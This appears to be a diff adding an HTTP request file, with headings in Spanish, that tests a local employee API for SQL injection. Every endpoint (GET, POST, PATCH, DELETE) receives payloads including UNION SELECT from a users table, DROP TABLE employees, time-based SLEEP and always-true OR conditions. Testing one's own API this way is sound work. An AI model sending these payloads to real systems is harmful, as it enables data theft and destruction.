@@ -1,0 +1,405 @@
+###! GET
+
+###* Inyección SQL Básica
+GET http://localhost:1234/employees/filter?filter=name&value=' UNION SELECT * FROM users; --
+
+
+###* Inyección con Comandos SQL
+GET http://localhost:1234/employees/filter?filter=name&value='; DROP TABLE employees; --
+
+
+###* Inyección con Unión de Consultas
+GET http://localhost:1234/employees/filter?filter=name&value=' UNION SELECT * FROM users; --
+
+
+###* Inyección con Subconsultas
+GET http://localhost:1234/employees/filter?filter=name&value=' OR EXISTS (SELECT * FROM users WHERE username = 'admin'); --
+
+
+###* Inyección de Tiempo
+GET http://localhost:1234/employees/filter?filter=name&value=' OR IF(1=1, SLEEP(5), 0); --
+
+
+###* Inyección de Carga Útil
+GET http://localhost:1234/employees/filter?filter=name&value=' AND 1=CONVERT(int, CHAR(57)+CHAR(53)); --
+
+
+###* Inyección de Datos de Tipo
+GET http://localhost:1234/employees/filter?filter=name&value=' UNION SELECT 1, 'test', 'test' --
+
+
+###* Inyección con Comentarios
+GET http://localhost:1234/employees/filter?filter=name&value=' OR 'a'='a' --
+
+
+###* Inyección de Tipo de Datos en age
+GET http://localhost:1234/employees/filter?filter=age&value='1; DROP TABLE employees; --
+
+###* Inyección con Funciones de SQL
+GET http://localhost:1234/employees/filter?filter=name&value='1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0; --
+
+###! POST
+
+####* Inyección SQL Básica
+POST http://localhost:1234/employees
+Content-Type: application/json
+
+{
+  "id": "1'; DROP TABLE employees; --",
+  "first_name": "Luis",
+  "second_name": "Antonio",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "1900",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+####* Inyección con Comandos SQL
+POST http://localhost:1234/employees
+Content-Type: application/json
+
+{
+  "id": "1; DROP TABLE employees; --",
+  "first_name": "Luis",
+  "second_name": "Antonio",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "1900",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+####* Inyección con Unión de Consultas
+POST http://localhost:1234/employees
+Content-Type: application/json
+
+{
+  "id": "1 UNION SELECT * FROM users; --",
+  "first_name": "Luis",
+  "second_name": "Antonio",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "1900",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+####* Inyección con Subconsultas
+POST http://localhost:1234/employees
+Content-Type: application/json
+
+{
+  "id": "1 OR EXISTS (SELECT * FROM users WHERE username = 'admin'); --",
+  "first_name": "Luis",
+  "second_name": "Antonio",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "1900",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+####* Inyección de Tiempo
+POST http://localhost:1234/employees
+Content-Type: application/json
+
+{
+  "id": "1 OR IF(1=1, SLEEP(5), 0); --",
+  "first_name": "Luis",
+  "second_name": "Antonio",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "1900",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+####* Inyección de Carga Útil
+POST http://localhost:1234/employees
+Content-Type: application/json
+
+{
+  "id": "1 AND 1=CONVERT(int, CHAR(57)+CHAR(53)); --",
+  "first_name": "Luis",
+  "second_name": "Antonio",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "1900",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+####* Inyección de Datos de Tipo
+POST http://localhost:1234/employees
+Content-Type: application/json
+
+{
+  "id": "1 UNION SELECT 1, 'test', 'test'; --",
+  "first_name": "Luis",
+  "second_name": "Antonio",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "1900",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+####* Inyección con Comentarios
+POST http://localhost:1234/employees
+Content-Type: application/json
+
+{
+  "id": "1' OR 'a'='a'; --",
+  "first_name": "Luis",
+  "second_name": "Antonio",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "1900",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+###! PATCH
+
+####* Inyección SQL Básica
+PATCH http://localhost:1234/employees/id/8-888-8888
+Content-Type: application/json
+
+{
+  "id": "8-888-8888",
+  "first_name": "Luissssssss",
+  "second_name": "Antonioooooo",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "30000",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+####* Inyección con Comandos SQL
+PATCH http://localhost:1234/employees/id/8-888-8888
+Content-Type: application/json
+
+{
+  "id": "8-888-8888",
+  "first_name": "Luissssssss",
+  "second_name": "Antonioooooo",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "30000",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+####* Inyección con Unión de Consultas
+PATCH http://localhost:1234/employees/id/8-888-8888
+Content-Type: application/json
+
+{
+  "id": "8-888-8888 UNION SELECT * FROM users; --",
+  "first_name": "Luissssssss",
+  "second_name": "Antonioooooo",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "30000",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+####* Inyección con Subconsultas
+PATCH http://localhost:1234/employees/id/8-888-8888
+Content-Type: application/json
+
+{
+  "id": "8-888-8888 OR EXISTS (SELECT * FROM users WHERE username = 'admin'); --",
+  "first_name": "Luissssssss",
+  "second_name": "Antonioooooo",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "30000",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+####* Inyección de Tiempo
+PATCH http://localhost:1234/employees/id/8-888-8888
+Content-Type: application/json
+
+{
+  "id": "8-888-8888 OR IF(1=1, SLEEP(5), 0); --",
+  "first_name": "Luissssssss",
+  "second_name": "Antonioooooo",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "30000",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+####* Inyección de Carga Útil
+PATCH http://localhost:1234/employees/id/8-888-8888
+Content-Type: application/json
+
+{
+  "id": "8-888-8888 AND 1=CONVERT(int, CHAR(57)+CHAR(53)); --",
+  "first_name": "Luissssssss",
+  "second_name": "Antonioooooo",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "30000",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+####* Inyección de Datos de Tipo
+PATCH http://localhost:1234/employees/id/8-888-8888
+Content-Type: application/json
+
+{
+  "id": "8-888-8888 UNION SELECT 1, 'test', 'test'; --",
+  "first_name": "Luissssssss",
+  "second_name": "Antonioooooo",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "30000",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+####* Inyección con Comentarios
+PATCH http://localhost:1234/employees/id/8-888-8888
+Content-Type: application/json
+
+{
+  "id": "8-888-8888' OR 'a'='a'; --",
+  "first_name": "Luissssssss",
+  "second_name": "Antonioooooo",
+  "first_lastName": "Salazar",
+  "second_lastName": "Mora",
+  "age": 29,
+  "address": "Calle 10",
+  "email": "luis.salazar@example.com",
+  "phone_number": "+507 111-2233",
+  "hire_date": "2024-07-27",
+  "salary": "30000",
+  "department": "1",
+  "role": "2",
+  "username": "luis.salazar"
+}
+
+###! DELETE
+
+####* Inyección SQL Básica
+DELETE http://localhost:1234/employees/id/8-888-8888'; DROP TABLE employees; --
+
+####* Inyección con Comandos SQL
+DELETE http://localhost:1234/employees/id/8-888-8888; DROP TABLE employees; --
+
+####* Inyección con Unión de Consultas
+DELETE http://localhost:1234/employees/id/8-888-8888 UNION SELECT * FROM users; --
+
+####* Inyección con Subconsultas
+DELETE http://localhost:1234/employees/id/8-888-8888 OR EXISTS (SELECT * FROM users WHERE username = 'admin'); --
+
+####* Inyección de Tiempo
+DELETE http://localhost:1234/employees/id/8-888-8888 OR IF(1=1, SLEEP(5), 0); --
+
+####* Inyección de Carga Útil
+DELETE http://localhost:1234/employees/id/8-888-8888 AND 1=CONVERT(int, CHAR(57)+CHAR(53)); --
+
+####* Inyección de Datos de Tipo
+DELETE http://localhost:1234/employees/id/8-888-8888 UNION SELECT 1, 'test', 'test'; --
+
+####* Inyección con Comentarios
+DELETE http://localhost:1234/employees/id/8-888-8888' OR 'a'='a'; --
